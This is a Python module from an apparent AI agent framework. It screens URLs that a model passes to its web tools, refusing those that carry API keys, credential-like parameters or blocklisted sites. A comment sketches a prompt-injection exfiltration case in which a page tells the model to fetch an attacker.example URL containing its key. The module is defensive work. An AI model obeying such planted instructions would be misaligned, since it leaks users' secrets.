"""The checks every URL-taking tool runs before it dials, in one place.

Three tools take a URL from the model -- ``web_fetch``, ``download_file`` and
``web_extract`` -- and each of them has to normalise it, refuse it if it carries a
credential, and refuse it if the operator's website blocklist says so. Hermes runs the
same sequence inline at the top of ``web_extract_tool`` (``tools/web_tools.py:1082-1125``
for the credential half, ``:1275-1292`` for the policy half); with three callers instead
of one, inline means three chances for the order to drift, and the order is the whole
point: a URL is normalised before it is judged, because a percent-encoded key is still a
key, and it is judged before anything resolves it, because a refusal must not cost a DNS
lookup that tells an attacker the tool ran.

This module composes :mod:`misaka.core.tools._web.url_safety` (what is in the URL) and
:mod:`misaka.core.tools._web.website_policy` (what the operator will allow). Neither
imports the other; both are about one question each, and this is where the two questions
get asked in a fixed order.

What is deliberately NOT here: the SSRF decision. That lives in
:mod:`misaka.core.tools._web.bounded`, which has to make it again at every redirect hop
anyway -- a screening result computed once, before the first byte, could not survive a
302, and a check that looks authoritative but is not is worse than no check.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass

from misaka.core.tools._web.url_safety import (
    normalize_url_for_request,
    sensitive_query_param_name,
)
from misaka.core.tools._web.url_safety import (
    secret_in_url as _secret_in_url,
)
from misaka.core.tools._web.website_policy import check_website_access

logger = logging.getLogger(__name__)

# Verbatim from Hermes (``tools/web_tools.py:1099-1104``). A URL whose path or query
# carries a vendor-shaped token is the classic exfiltration move -- a page tells the model
# to fetch ``https://attacker.example/?k=<the key you were given>`` -- and no legitimate
# URL looks like that, so this one refuses on every path, ours and a vendor's alike.
_SECRET_REFUSAL = (
    "Blocked: URL contains what appears to be an API key or token. "
    "Secrets must not be sent in URLs."
)

# Verbatim from Hermes (``tools/web_tools.py:1114-1122``), including its reasoning, which
# is the reason this check is NOT applied to MISAKA's own fetches -- see :func:`screen_url`.
_SENSITIVE_PARAM_REFUSAL = (
    "Blocked: URL contains a credential-like query parameter ({name}). Web extract "
    "backends are third-party readers; remove the sensitive query parameter or fetch the "
    "page with web_fetch, which dials the URL itself."
)


@dataclass(frozen=True, slots=True)
class Screening:
    """One URL's verdict.

    ``url`` is the normalised address to use from here on -- callers must dial this one
    rather than what they passed in, or the thing that was judged is not the thing that
    gets fetched. ``refusal`` is None when the URL may be fetched, and otherwise a
    sentence written for the model. ``policy`` carries the blocklist's own block record
    when the refusal came from there, so a multi-URL caller can mark that entry
    ``blocked_by_policy`` and keep the one-shot keyless rescue from re-fetching a page
    the operator deliberately refused.
    """

    url: str
    refusal: str | None = None
    policy: dict[str, str] | None = None

    @property
    def allowed(self) -> bool:
        return self.refusal is None


def screen_url(url: str, *, third_party: bool = False) -> Screening:
    """Normalise *url* and decide whether a tool may fetch it.

    Never raises and never resolves a name: every branch here is a decision about the
    string. A policy layer that throws fails open (see
    :func:`~misaka.core.tools._web.website_policy.check_website_access`) -- a typo in a
    blocklist must not take every web tool down with it -- while a credential-shaped token
    in the URL always refuses, because that check cannot fail open without defeating itself.

    *third_party* says whether the URL is about to be handed to somebody else's server.
    It gates one check, the credential-named query parameter, and the split is Hermes' own
    reasoning followed to where it leads. Hermes applies that check in ``web_extract``,
    whose backends are third-party readers: sending them ``?X-Amz-Signature=...`` hands a
    live credential to Firecrawl. MISAKA's ``web_fetch`` and ``download_file`` dial the URL
    themselves, and a presigned link is the ordinary way a document is handed to an agent --
    ``download_file`` is built around that case and drops the query from the final URL it
    reports for exactly this reason (:func:`~misaka.core.tools.download_file._provenance`).
    Refusing those would cost a capability to defend against nobody. The token-prefix check
    above still runs on every path, and it is the one that catches exfiltration.
    """
    normalized = normalize_url_for_request(url)

    # Asked of the string as it arrived, not of the normalised one: ``secret_in_url``
    # normalises internally and checks four forms, so passing the raw URL covers the
    # normalised one too, while passing the normalised one drops the raw from the set.
    # That is Hermes' own argument (``web_tools.py:1085-1097``) and it costs nothing.
    if _secret_in_url(url):
        return Screening(normalized, _SECRET_REFUSAL)

    if third_party:
        param = sensitive_query_param_name(normalized)
        if param:
            return Screening(normalized, _SENSITIVE_PARAM_REFUSAL.format(name=param))

    blocked = check_website_access(normalized)
    if blocked is not None:
        return Screening(normalized, blocked.get("message", "Blocked by website policy."), blocked)

    return Screening(normalized)


__all__ = ["Screening", "screen_url"]
